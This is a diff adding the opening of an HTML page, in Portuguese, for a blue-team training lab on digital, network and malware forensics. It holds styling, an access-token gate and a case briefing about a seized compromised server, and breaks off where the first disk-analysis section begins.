@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
+  <meta name="description" content="Blue Team Army — Lab 06: Perícia BTA. Forense digital, rede e malware." />
+  <title>LAB 06 — Perícia BTA | Blue Team Army</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Exo+2:wght@400;600;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet" />
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --navy:#0a0e1a; --navy-mid:#0d1525; --navy-lite:#111e38;
+      --border:#1a2a4a; --border2:#1a3060;
+      --cyan:#00e5ff; --blue:#4a9eff; --green:#00e676;
+      --yellow:#febc2e; --red:#ff1744; --orange:#ff9100;
+      --text:#c8d8f0; --text-dim:#a0c4e0; --text-faint:#2a4a7a;
+      --dim:#8eaac8; --white:#e8f4ff;
+    }
+    html,body { background:var(--navy); color:var(--text); font-family:'Exo 2',sans-serif; overflow-x:hidden; }
+
+    /* ── Token Gate ── */
+    #token-gate { display:none; position:fixed; inset:0; background:var(--navy); z-index:999; flex-direction:column; align-items:center; justify-content:center; padding:24px; text-align:center; }
+    .show-gate #token-gate { display:flex; }
+    .tg-title { font-family:'Exo 2',sans-serif; font-size:clamp(18px,3.5vw,26px); font-weight:700; color:var(--white); margin-bottom:8px; }
+    .tg-sub { font-family:'Rajdhani',sans-serif; font-size:14px; color:var(--text-dim); margin-bottom:28px; }
+    .tg-input { display:block; background:var(--navy-mid); border:1px solid var(--border); color:var(--text); font-family:'Share Tech Mono',monospace; font-size:14px; padding:10px 16px; border-radius:6px; outline:none; width:100%; max-width:340px; text-align:center; letter-spacing:2px; transition:border-color .2s; margin-bottom:12px; }
+    .tg-input:focus { border-color:var(--cyan); }
+    .tg-input.tg-shake { border-color:var(--red); animation:tg-shake .3s ease; }
+    @keyframes tg-shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-6px)} 75%{transform:translateX(6px)} }
+    .tg-btn { display:block; font-family:'Rajdhani',sans-serif; font-size:15px; font-weight:700; letter-spacing:2px; text-transform:uppercase; color:var(--cyan); background:rgba(0,229,255,.06); border:1.5px solid var(--cyan); padding:10px 32px; border-radius:6px; cursor:pointer; transition:background .15s; width:100%; max-width:340px; margin-bottom:14px; }
+    .tg-btn:hover { background:rgba(0,229,255,.12); }
+    .tg-err-msg { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--red); min-height:16px; opacity:0; transition:opacity .2s; }
+    .tg-err-msg.visible { opacity:1; }
+
+    /* ── HUD ── */
+    #hud { position:fixed; top:14px; right:18px; background:var(--navy-mid); border:1px solid var(--border2); border-radius:6px; padding:6px 14px 7px; z-index:200; text-align:right; pointer-events:none; box-shadow:0 2px 16px rgba(0,0,0,.4); }
+    .hud-label { font-family:'Rajdhani',sans-serif; font-size:9px; letter-spacing:1.5px; text-transform:uppercase; color:var(--text-faint); display:block; }
+    .hud-val { font-family:'Exo 2',sans-serif; font-size:19px; font-weight:700; color:var(--cyan); line-height:1.1; }
+    .hud-val .hud-tot { font-size:12px; color:var(--dim); font-weight:400; }
+
+    /* ── Toast ── */
+    .flag-toast { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#0b1d3a; border:2px solid var(--cyan); border-radius:10px; padding:24px 34px; text-align:center; z-index:500; pointer-events:none; min-width:220px; }
+    .flag-toast.show { display:block; animation:popin .28s ease; }
+    @keyframes popin { from{transform:translate(-50%,-50%) scale(.82);opacity:0} to{transform:translate(-50%,-50%) scale(1);opacity:1} }
+    .ft-label { font-family:'Rajdhani',sans-serif; font-size:12px; color:var(--blue); letter-spacing:2px; text-transform:uppercase; }
+    .ft-pts { font-family:'Exo 2',sans-serif; font-size:32px; color:var(--cyan); font-weight:700; margin:6px 0; }
+    .ft-msg { font-size:12px; color:var(--green); }
+
+    /* ── Page ── */
+    .page { min-height:100vh; display:flex; flex-direction:column; align-items:center; padding:24px 16px 60px; gap:20px; }
+
+    /* ── Header ── */
+    .site-header { width:100%; max-width:980px; display:flex; align-items:center; justify-content:space-between; padding:0 4px; }
+    .logo { display:flex; align-items:center; gap:12px; text-decoration:none; }
+    .logo-hex { width:40px; height:40px; flex-shrink:0; }
+    .logo-text { font-family:'Exo 2',sans-serif; font-size:18px; font-weight:700; color:var(--cyan); letter-spacing:1.5px; line-height:1.1; }
+    .logo-sub { font-family:'Rajdhani',sans-serif; font-size:11px; color:var(--blue); letter-spacing:2px; text-transform:uppercase; }
+    .header-link { font-family:'Rajdhani',sans-serif; font-size:13px; color:var(--blue); text-decoration:none; border:1px solid var(--border); padding:6px 14px; border-radius:4px; transition:border-color .15s,color .15s; }
+    .header-link:hover { color:var(--cyan); border-color:var(--cyan); }
+
+    /* ── Hero ── */
+    .hero { width:100%; max-width:980px; text-align:center; padding:4px 0 2px; }
+    .hero-tag { display:inline-block; font-family:'Rajdhani',sans-serif; font-size:11px; letter-spacing:3px; text-transform:uppercase; color:var(--cyan); border:1px solid var(--border); padding:4px 12px; border-radius:2px; margin-bottom:12px; }
+    .hero-title { font-family:'Exo 2',sans-serif; font-size:clamp(22px,4vw,34px); font-weight:700; color:var(--white); line-height:1.2; margin-bottom:6px; }
+    .hero-title span { color:var(--cyan); }
+    .hero-subtitle { font-family:'Rajdhani',sans-serif; font-size:13px; color:var(--blue); letter-spacing:2px; text-transform:uppercase; margin-bottom:14px; }
+    .act-progress { display:flex; align-items:center; justify-content:center; gap:6px; flex-wrap:wrap; }
+    .act-step { display:flex; align-items:center; gap:6px; padding:4px 12px; border:1px solid var(--border); border-radius:20px; font-family:'Rajdhani',sans-serif; font-size:11px; color:var(--text-faint); transition:border-color .3s,color .3s,background .3s; white-space:nowrap; }
+    .act-step--active { border-color:var(--cyan); color:var(--cyan); background:rgba(0,229,255,.06); }
+    .act-step--done   { border-color:var(--green); color:var(--green); background:rgba(0,230,118,.06); }
+    .step-num { width:16px; height:16px; border-radius:50%; border:1.5px solid currentColor; display:flex; align-items:center; justify-content:center; font-size:8px; font-weight:700; flex-shrink:0; }
+    .act-step--done .step-num::after { content:'✓'; font-size:8px; }
+    .act-arrow { color:var(--border2); font-size:12px; }
+
+    /* ── Briefing ── */
+    .briefing-card { width:100%; max-width:980px; background:#050810; border:1px solid var(--border2); border-left:4px solid var(--cyan); border-radius:8px; overflow:hidden; }
+    .bt-bar { display:flex; align-items:center; gap:7px; padding:7px 14px; background:var(--navy-mid); border-bottom:1px solid var(--border); }
+    .bt-dot { width:9px; height:9px; border-radius:50%; }
+    .bt-dot-r{background:var(--red);opacity:.8} .bt-dot-y{background:var(--yellow);opacity:.8} .bt-dot-g{background:var(--green);opacity:.8}
+    .bt-title-bar { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--dim); margin-left:4px; }
+    .bt-body { padding:14px 18px; font-family:'Share Tech Mono',monospace; font-size:12px; line-height:1.9; color:var(--text-dim); }
+    .bt-hi { color:var(--cyan); font-weight:bold; }
+    .bt-warn { color:var(--orange); }
+    .bt-cursor { display:inline-block; width:8px; height:13px; background:var(--cyan); vertical-align:middle; margin-left:2px; animation:blink 1s step-end infinite; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+    /* ── Ato Card ── */
+    .ato-wrap { width:100%; max-width:980px; }
+    .ato-card { background:var(--navy-mid); border:1px solid var(--border); border-radius:10px; overflow:hidden; }
+    .ato-hdr { padding:11px 18px; background:#080c18; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:12px; }
+    .ato-num { width:30px; height:30px; border-radius:50%; border:2px solid var(--cyan); display:flex; align-items:center; justify-content:center; font-family:'Exo 2',sans-serif; font-size:14px; font-weight:700; color:var(--cyan); flex-shrink:0; transition:border-color .3s,color .3s; }
+    .ato-num.done { border-color:var(--green); color:var(--green); }
+    .ato-tag { font-family:'Rajdhani',sans-serif; font-size:10px; letter-spacing:1.5px; text-transform:uppercase; color:var(--dim); }
+    .ato-title { font-family:'Exo 2',sans-serif; font-size:15px; font-weight:700; color:var(--white); flex:1; }
+    .ato-score { font-family:'Exo 2',sans-serif; font-size:14px; font-weight:700; color:var(--cyan); white-space:nowrap; }
+    .ato-body { padding:16px; display:flex; gap:16px; }
+    .main-col { flex:1; min-width:0; }
+    .side-col { width:250px; flex-shrink:0; }
+    .sub-label { font-family:'Rajdhani',sans-serif; font-size:11px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:var(--text-faint); margin-bottom:8px; display:block; }
+
+    /* Locked ato */
+    .locked-card { background:var(--navy-mid); border:1px solid var(--border); border-radius:10px; padding:28px; text-align:center; }
+    .locked-icon { font-size:28px; margin-bottom:10px; opacity:.5; }
+    .locked-title { font-family:'Exo 2',sans-serif; font-size:14px; font-weight:700; color:var(--dim); margin-bottom:5px; }
+    .locked-msg { font-family:'Exo 2',sans-serif; font-size:13px; color:var(--text-faint); }
+
+    /* Section reveal */
+    .section-wrap { width:100%; max-width:980px; opacity:0; transform:translateY(20px); transition:opacity .5s ease,transform .5s ease; }
+    .section-wrap.visible { opacity:1; transform:translateY(0); }
+
+    /* ── Checklist ── */
+    .chk-header { font-family:'Rajdhani',sans-serif; font-size:11px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:var(--text-faint); margin-bottom:8px; }
+    .checklist { display:flex; flex-direction:column; gap:7px; }
+    .chk-item { display:flex; align-items:flex-start; gap:9px; padding:8px 11px; border-radius:5px; background:var(--navy); border:1px solid var(--border); transition:all .25s; }
+    .chk-item.done { border-color:var(--green); background:rgba(0,230,118,.06); }
+    .chk-dot { width:15px; height:15px; border-radius:50%; border:1.5px solid var(--border2); flex-shrink:0; margin-top:1px; display:flex; align-items:center; justify-content:center; transition:all .2s; }
+    .chk-item.done .chk-dot { border-color:var(--green); background:var(--green); }
+    .chk-item.done .chk-dot::after { content:'✓'; color:#000; font-size:8px; font-weight:900; }
+    .chk-text { font-family:'Exo 2',sans-serif; font-size:11px; color:var(--text-dim); line-height:1.4; flex:1; }
+    .chk-item.done .chk-text { color:var(--green); }
+    .chk-pts { font-family:'Exo 2',sans-serif; font-size:11px; font-weight:700; color:var(--dim); display:block; margin-top:2px; }
+    .chk-item.done .chk-pts { color:var(--green); }
+
+    /* ── Forensic Explorer ── */
+    .fex-card { background:#050810; border:1px solid var(--border); border-radius:8px; overflow:hidden; }
+    .fex-tabs { display:flex; border-bottom:1px solid var(--border); background:var(--navy-mid); }
+    .fex-tab { font-family:'Rajdhani',sans-serif; font-size:12px; font-weight:700; letter-spacing:1px; text-transform:uppercase; padding:7px 16px; cursor:pointer; color:var(--dim); border-bottom:2px solid transparent; transition:color .15s,border-color .15s; border:none; background:transparent; }
+    .fex-tab:hover { color:var(--text); }
+    .fex-tab.active { color:var(--cyan); border-bottom:2px solid var(--cyan); }
+    .fex-body { display:none; }
+    .fex-body.active { display:flex; height:320px; }
+
+    /* Explorer panel */
+    .fex-tree-panel { width:220px; flex-shrink:0; border-right:1px solid var(--border); overflow-y:auto; padding:6px 0; }
+    .fex-tree-panel::-webkit-scrollbar{width:4px} .fex-tree-panel::-webkit-scrollbar-thumb{background:var(--border)}
+    .tree-node { padding:3px 8px 3px 0; cursor:pointer; user-select:none; display:flex; align-items:center; gap:4px; transition:background .1s; }
+    .tree-node:hover { background:rgba(74,158,255,.07); }
+    .tree-node.selected { background:rgba(0,229,255,.1); }
+    .tree-chevron { font-size:9px; color:var(--dim); width:12px; flex-shrink:0; transition:transform .15s; }
+    .tree-chevron.open { transform:rotate(90deg); }
+    .tree-icon { font-size:12px; flex-shrink:0; }
+    .tree-name { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--text-dim); }
+    .tree-node.suspicious .tree-name { color:var(--orange); }
+    .tree-node.recent .tree-name { color:var(--yellow); }
+    .tree-children { display:none; }
+    .tree-children.open { display:block; }
+
+    /* Detail panel */
+    .fex-detail-panel { flex:1; min-width:0; display:flex; flex-direction:column; }
+    .fex-detail-empty { flex:1; display:flex; align-items:center; justify-content:center; font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--text-faint); }
+    .fex-meta-table { flex-shrink:0; border-bottom:1px solid var(--border); }
+    .fex-meta-table table { width:100%; border-collapse:collapse; }
+    .fex-meta-table td { font-family:'Share Tech Mono',monospace; font-size:10.5px; padding:4px 12px; }
+    .fex-meta-table td:first-child { color:var(--dim); width:110px; }
+    .fex-meta-table td:last-child { color:var(--text-dim); }
+    .fex-meta-table tr.future td:last-child { color:var(--red); font-weight:700; }
+    .fex-content { flex:1; overflow-y:auto; padding:10px 12px; font-family:'Share Tech Mono',monospace; font-size:10.5px; line-height:1.7; color:var(--text-dim); white-space:pre-wrap; word-break:break-all; }
+    .fex-content::-webkit-scrollbar{width:4px} .fex-content::-webkit-scrollbar-thumb{background:var(--border)}
+    .fex-content .suspicious-line { color:var(--orange); }
+    .fex-content .warning-line { color:var(--red); }
+
+    /* Timeline tab */
+    .fex-tl-body { flex-direction:column; padding:12px; gap:10px; overflow-y:auto; }
+    .fex-tl-body::-webkit-scrollbar{width:4px} .fex-tl-body::-webkit-scrollbar-thumb{background:var(--border)}
+    .fex-tl-actions { display:flex; align-items:center; gap:10px; flex-shrink:0; }
+    .btn-export-tl { font-family:'Rajdhani',sans-serif; font-size:13px; font-weight:700; letter-spacing:1px; text-transform:uppercase; color:var(--cyan); background:rgba(0,229,255,.07); border:1px solid var(--cyan); padding:6px 16px; border-radius:4px; cursor:pointer; transition:background .15s; }
+    .btn-export-tl:hover { background:rgba(0,229,255,.14); }
+    .fex-tl-hint { font-family:'Exo 2',sans-serif; font-size:11px; color:var(--text-faint); }
+    .fex-tl-table { width:100%; border-collapse:collapse; flex:1; }
+    .fex-tl-table th { background:var(--navy-mid); font-family:'Rajdhani',sans-serif; font-size:10px; font-weight:700; letter-spacing:1px; text-transform:uppercase; color:var(--text-faint); padding:6px 10px; text-align:left; border-bottom:1px solid var(--border); }
+    .fex-tl-table td { font-family:'Share Tech Mono',monospace; font-size:10.5px; padding:5px 10px; border-bottom:1px solid rgba(26,42,74,.4); color:var(--text-dim); }
+    .fex-tl-table tr.tl-suspicious td { color:var(--orange); }
+    .fex-tl-table tr.tl-future td { color:var(--red); }
+    .fex-tl-table tr.tl-recent td:nth-child(2) { color:var(--yellow); }
+
+    /* ── Packet Viewer ── */
+    .pkt-toolbar { display:flex; gap:7px; margin-bottom:10px; flex-wrap:wrap; }
+    .pkt-filter-btn { font-family:'Rajdhani',sans-serif; font-size:12px; font-weight:700; letter-spacing:1px; padding:4px 10px; border:1px solid var(--border); border-radius:4px; background:transparent; color:var(--dim); cursor:pointer; transition:all .15s; }
+    .pkt-filter-btn:hover { border-color:var(--blue); color:var(--blue); }
+    .pkt-filter-btn.active { border-color:var(--cyan); color:var(--cyan); background:rgba(0,229,255,.07); }
+    .pkt-table-wrap { background:#050810; border:1px solid var(--border); border-radius:6px; overflow:hidden; max-height:280px; overflow-y:auto; }
+    .pkt-table-wrap::-webkit-scrollbar{width:5px} .pkt-table-wrap::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+    .pkt-table { width:100%; border-collapse:collapse; }
+    .pkt-table th { background:var(--navy-mid); color:var(--text-faint); font-family:'Rajdhani',sans-serif; font-size:10px; font-weight:700; letter-spacing:1px; text-transform:uppercase; padding:7px 10px; text-align:left; border-bottom:1px solid var(--border); white-space:nowrap; position:sticky; top:0; z-index:1; }
+    .pkt-row { border-bottom:1px solid rgba(26,42,74,.4); cursor:pointer; transition:background .1s; }
+    .pkt-row:hover { background:rgba(74,158,255,.06); }
+    .pkt-row.selected { background:rgba(0,229,255,.08); }
+    .pkt-row td { padding:5px 10px; font-family:'Share Tech Mono',monospace; font-size:10.5px; color:var(--text-dim); white-space:nowrap; }
+    .pkt-row td.pkt-info { font-family:'Exo 2',sans-serif; font-size:11px; overflow:hidden; text-overflow:ellipsis; max-width:200px; }
+    .proto-dns { color:#7fd4e8; } .proto-http { color:#a0c864; } .proto-https { color:#80d4a0; } .proto-tcp { color:var(--dim); }
+    .pkt-anomalous td { color:#f0a080; }
+    .pkt-detail-row { display:none; }
+    .pkt-row.open + .pkt-detail-row { display:table-row; }
+    .pkt-detail-cell { padding:8px 10px 10px 36px; background:rgba(0,229,255,.04); border-top:1px solid rgba(0,229,255,.08); font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--cyan); line-height:1.8; }
+    .log-hint { font-family:'Exo 2',sans-serif; font-size:11px; color:var(--text-faint); margin-top:8px; }
+
+    /* ── Malware Analysis ── */
+    .mal-card { background:#050810; border:1px solid var(--border); border-radius:8px; overflow:hidden; }
+    .mal-tabs { display:flex; border-bottom:1px solid var(--border); background:var(--navy-mid); overflow-x:auto; }
+    .mal-tab { font-family:'Share Tech Mono',monospace; font-size:11px; padding:7px 16px; cursor:pointer; color:var(--dim); border-bottom:2px solid transparent; transition:color .15s,border-color .15s; border-top:none; border-left:none; border-right:none; background:transparent; flex-shrink:0; white-space:nowrap; }
+    .mal-tab:hover { color:var(--text); }
+    .mal-tab.active { color:var(--cyan); border-bottom:2px solid var(--cyan); }
+    .mal-panel { display:none; padding:14px; }
+    .mal-panel.active { display:block; }
+    .mal-cmd-line { font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--cyan); margin-bottom:10px; }
+    .mal-cmd-line .prompt { color:var(--green); }
+    .mal-output-box { background:var(--navy-mid); border:1px solid var(--border); border-radius:5px; padding:10px 14px; font-family:'Share Tech Mono',monospace; font-size:11px; min-height:60px; max-height:260px; overflow-y:auto; line-height:1.7; }
+    .mal-output-box::-webkit-scrollbar{width:4px} .mal-output-box::-webkit-scrollbar-thumb{background:var(--border)}
+    .mal-placeholder { color:var(--text-faint); font-style:italic; }
+    .mal-output-box .str-normal { color:var(--text-dim); }
+    .mal-output-box .str-suspect { color:var(--orange); }
+    .mal-output-box .str-critical { color:var(--red); cursor:pointer; text-decoration:underline dotted; }
+    .mal-output-box .str-critical:hover { color:var(--yellow); }
+    .mal-output-box .str-api { color:#b0d0ff; }
+    .mal-result-line { color:var(--green); display:block; }
+    .btn-run-cmd { font-family:'Rajdhani',sans-serif; font-size:13px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:var(--green); background:rgba(0,230,118,.07); border:1px solid var(--green); padding:6px 18px; border-radius:4px; cursor:pointer; transition:background .15s; margin-bottom:10px; }
+    .btn-run-cmd:hover { background:rgba(0,230,118,.14); }
+    .btn-run-cmd:disabled { opacity:.4; cursor:not-allowed; }
+
+    /* Hash lookup */
+    .hash-lookup-box { background:var(--navy-mid); border:1px solid var(--border); border-radius:6px; padding:12px 16px; }
+    .hl-hash-row { display:flex; align-items:center; gap:10px; margin-bottom:12px; }
+    .hl-hash-val { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--dim); flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .btn-lookup { font-family:'Rajdhani',sans-serif; font-size:13px; font-weight:700; letter-spacing:1px; text-transform:uppercase; color:var(--cyan); background:rgba(0,229,255,.08); border:1px solid var(--cyan); padding:6px 16px; border-radius:4px; cursor:pointer; transition:background .15s; flex-shrink:0; }
+    .btn-lookup:hover { background:rgba(0,229,255,.16); }
+    .hl-result { display:none; }
+    .hl-result.visible { display:block; }
+    .hl-verdict { display:flex; align-items:center; gap:12px; padding:10px 14px; background:rgba(255,23,68,.1); border:1px solid rgba(255,23,68,.3); border-radius:5px; margin-bottom:12px; }
+    .hl-verdict-icon { font-size:22px; }
+    .hl-verdict-text { font-family:'Exo 2',sans-serif; font-size:15px; font-weight:700; color:var(--red); }
+    .hl-verdict-count { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--orange); margin-top:2px; }
+    .hl-fields { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+    .hl-field { background:var(--navy); border:1px solid var(--border); border-radius:4px; padding:8px 10px; }
+    .hl-field-label { font-family:'Rajdhani',sans-serif; font-size:9px; letter-spacing:1.5px; text-transform:uppercase; color:var(--text-faint); margin-bottom:3px; }
+    .hl-field-val { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--text-dim); line-height:1.4; }
+    .hl-tags { display:flex; flex-wrap:wrap; gap:5px; }
+    .hl-tag { font-family:'Share Tech Mono',monospace; font-size:10px; padding:2px 7px; border-radius:3px; background:rgba(255,23,68,.1); border:1px solid rgba(255,23,68,.3); color:var(--red); }
+
+    /* ── Laudo Form ── */
+    .laudo-card { background:var(--navy-mid); border:1px solid var(--border); border-radius:10px; overflow:hidden; }
+    .laudo-hdr { padding:12px 18px; background:#080c18; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:12px; }
+    .laudo-badge { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--cyan); background:rgba(0,229,255,.08); border:1px solid rgba(0,229,255,.2); padding:2px 8px; border-radius:3px; flex-shrink:0; }
+    .laudo-title { font-family:'Exo 2',sans-serif; font-size:16px; font-weight:700; color:var(--white); flex:1; }
+    .laudo-body { padding:20px; }
+    .laudo-form { display:grid; grid-template-columns:1fr 1fr; gap:14px 20px; margin-bottom:20px; }
+    .form-group { display:flex; flex-direction:column; gap:6px; }
+    .form-group.full-width { grid-column:1/-1; }
+    .form-label { font-family:'Rajdhani',sans-serif; font-size:11px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:var(--text-dim); }
+    .form-input,.form-select,.form-textarea { background:var(--navy); border:1px solid var(--border); border-radius:5px; color:var(--text); font-family:'Share Tech Mono',monospace; font-size:12px; padding:8px 12px; outline:none; width:100%; transition:border-color .15s; }
+    .form-input:focus,.form-select:focus,.form-textarea:focus { border-color:var(--cyan); }
+    .form-select { appearance:none; background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7' viewBox='0 0 12 7'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238eaac8' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E"); background-repeat:no-repeat; background-position:right 12px center; padding-right:32px; }
+    .form-select option { background:var(--navy-mid); }
+    .form-textarea { min-height:80px; resize:vertical; font-family:'Exo 2',sans-serif; font-size:13px; }
+    .btn-assinar { font-family:'Rajdhani',sans-serif; font-size:15px; font-weight:700; letter-spacing:2px; text-transform:uppercase; color:var(--cyan); background:rgba(0,229,255,.08); border:1.5px solid var(--cyan); border-radius:6px; padding:11px 28px; cursor:pointer; transition:background .15s; }
+    .btn-assinar:hover:not(:disabled) { background:rgba(0,229,255,.16); }
+    .btn-assinar:disabled { opacity:.35; cursor:not-allowed; }
+
+    /* Signed laudo banner */
+    .laudo-assinado { display:none; margin-top:20px; }
+    .laudo-assinado.visible { display:block; }
+    .laudo-doc { background:#050810; border:2px solid var(--cyan); border-radius:10px; padding:24px; font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--text-dim); line-height:1.9; margin-bottom:16px; }
+    .laudo-doc .ld-title { font-family:'Exo 2',sans-serif; font-size:16px; font-weight:700; color:var(--cyan); text-align:center; margin-bottom:4px; }
+    .laudo-doc .ld-sub { font-family:'Rajdhani',sans-serif; font-size:12px; color:var(--blue); text-align:center; letter-spacing:2px; margin-bottom:16px; }
+    .laudo-doc .ld-sep { border:none; border-top:1px solid var(--border); margin:12px 0; }
+    .laudo-doc .ld-field { display:flex; gap:12px; }
+    .laudo-doc .ld-key { color:var(--blue); width:200px; flex-shrink:0; }
+    .laudo-doc .ld-val { color:var(--text); }
+    .laudo-doc .ld-sig { text-align:center; margin-top:16px; color:var(--green); font-family:'Exo 2',sans-serif; font-size:13px; font-weight:700; }
+    .lc-banner { background:var(--navy); border:2px solid var(--cyan); border-radius:10px; padding:28px; text-align:center; }
+    .lc-icon { font-size:36px; margin-bottom:8px; }
+    .lc-title { font-family:'Exo 2',sans-serif; font-size:22px; font-weight:700; color:var(--cyan); margin-bottom:6px; }
+    .lc-score { font-family:'Exo 2',sans-serif; font-size:40px; font-weight:700; color:var(--yellow); margin-bottom:10px; letter-spacing:2px; }
+    .lc-msg { font-family:'Rajdhani',sans-serif; font-size:14px; color:var(--text-dim); max-width:500px; margin:0 auto; line-height:1.6; }
+    .lc-back { display:inline-block; margin-top:20px; font-family:'Rajdhani',sans-serif; font-size:14px; font-weight:700; letter-spacing:1px; color:var(--green); background:transparent; border:1px solid var(--green); padding:10px 28px; border-radius:5px; text-decoration:none; transition:background .15s; }
+    .lc-back:hover { background:rgba(0,230,118,.08); }
+
+    /* ── Footer ── */
+    .site-footer { width:100%; max-width:980px; border-top:1px solid var(--border); padding-top:20px; display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:10px; }
+    .footer-text { font-family:'Rajdhani',sans-serif; font-size:12px; color:var(--text-faint); }
+    .footer-link { font-family:'Rajdhani',sans-serif; font-size:12px; color:var(--blue); text-decoration:none; }
+    .footer-link:hover { color:var(--cyan); }
+
+    @media(max-width:680px) {
+      .header-link{display:none}
+      .ato-body{flex-direction:column}
+      .side-col{width:100%}
+      .fex-body{height:auto;flex-direction:column}
+      .fex-tree-panel{width:100%;height:160px;border-right:none;border-bottom:1px solid var(--border)}
+      .laudo-form{grid-template-columns:1fr}
+      .laudo-form .form-group.full-width{grid-column:auto}
+      #hud{top:auto;bottom:14px;right:14px}
+    }
+  </style>
+
+  <script>
+    if (localStorage.getItem('bta-lab06-access') === 'BTA-LAB06-2026') {
+      document.documentElement.classList.remove('show-gate');
+    } else {
+      document.documentElement.classList.add('show-gate');
+    }
+  </script>
+</head>
+<body>
+
+<!-- Token Gate -->
+<div id="token-gate" role="dialog" aria-modal="true">
+  <div style="margin-bottom:28px">
+    <svg viewBox="0 0 40 46" width="52" height="60" fill="none">
+      <path d="M20 1L38 11V35L20 45L2 35V11L20 1Z" stroke="#00e5ff" stroke-width="1.5" fill="none"/>
+      <path d="M20 8L33 15.5V30.5L20 38L7 30.5V15.5L20 8Z" fill="#0d1525" stroke="#1a3060" stroke-width="1"/>
+      <text x="20" y="27" text-anchor="middle" font-family="'Exo 2',sans-serif" font-size="11" font-weight="700" fill="#00e5ff">BTA</text>
+    </svg>
+  </div>
+  <h1 class="tg-title">LAB 06 — Acesso Restrito</h1>
+  <p class="tg-sub">Este lab é exclusivo para alunos matriculados.</p>
+  <input type="text" id="token-input" class="tg-input" placeholder="Digite seu token de acesso" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false"/>
+  <button type="button" id="token-btn" class="tg-btn">Acessar Lab</button>
+  <p class="tg-err-msg" id="token-err">Token inválido.</p>
+</div>
+
+<!-- HUD -->
+<div id="hud">
+  <span class="hud-label">Pontuação</span>
+  <div class="hud-val"><span id="hud-pts">0</span> <span class="hud-tot">/ 900 pts</span></div>
+</div>
+
+<!-- Toast -->
+<div class="flag-toast" id="flag-toast">
+  <div class="ft-label" id="toast-label">🔍 Descoberta!</div>
+  <div class="ft-pts" id="toast-pts">+75 pts</div>
+  <div class="ft-msg" id="toast-msg"></div>
+</div>
+
+<div class="page">
+
+  <!-- Header -->
+  <header class="site-header">
+    <a class="logo" href="#">
+      <svg class="logo-hex" viewBox="0 0 40 46" fill="none" aria-hidden="true">
+        <path d="M20 1L38 11V35L20 45L2 35V11L20 1Z" stroke="#00e5ff" stroke-width="1.5" fill="none"/>
+        <path d="M20 8L33 15.5V30.5L20 38L7 30.5V15.5L20 8Z" fill="#0d1525" stroke="#1a3060" stroke-width="1"/>
+        <text x="20" y="27" text-anchor="middle" font-family="'Exo 2',sans-serif" font-size="11" font-weight="700" fill="#00e5ff">BTA</text>
+      </svg>
+      <div>
+        <div class="logo-text">BLUE TEAM ARMY</div>
+        <div class="logo-sub">Training Lab</div>
+      </div>
+    </a>
+    <a class="header-link" href="https://blueteam.army" target="_blank" rel="noopener">blueteam.army &rarr;</a>
+  </header>
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="hero-tag">Módulo 6 · Forensics: Digital, Network e Malware</div>
+    <h1 class="hero-title">LAB 06 — <span>Perícia BTA</span></h1>
+    <p class="hero-subtitle">Caso BTA-2024-0042 · Análise forense completa</p>
+    <div class="act-progress">
+      <div class="act-step act-step--active" id="prog-1"><span class="step-num">1</span>Ato 1: Disco</div>
+      <div class="act-arrow">→</div>
+      <div class="act-step" id="prog-2"><span class="step-num">2</span>Ato 2: Rede</div>
+      <div class="act-arrow">→</div>
+      <div class="act-step" id="prog-3"><span class="step-num">3</span>Ato 3: Malware</div>
+      <div class="act-arrow">→</div>
+      <div class="act-step" id="prog-4"><span class="step-num">4</span>Laudo</div>
+    </div>
+  </section>
+
+  <!-- Briefing Terminal -->
+  <div class="briefing-card" style="width:100%;max-width:980px">
+    <div class="bt-bar">
+      <span class="bt-dot bt-dot-r"></span><span class="bt-dot bt-dot-y"></span><span class="bt-dot bt-dot-g"></span>
+      <span class="bt-title-bar">BTA Forensics Workstation — CASO BTA-2024-0042</span>
+    </div>
+    <div class="bt-body">
+      <span class="bt-hi">CASO BTA-2024-0042</span> — Servidor comprometido apreendido em 2024-11-08T06:30Z<br>
+      Evidências coletadas: <span class="bt-warn">imagem de disco (20 GB)</span> · <span class="bt-warn">captura de rede (2h)</span> · <span class="bt-warn">amostra de malware</span><br>
+      Você é o <span class="bt-hi">perito forense</span>. Analise cada evidência, documente as descobertas<br>
+      e ao final produza o <span class="bt-hi">laudo técnico</span> assinado.<span class="bt-cursor"></span>
+    </div>
+  </div>
+
+  <!-- ═══ ATO 1 — ANÁLISE DE DISCO ═══ -->
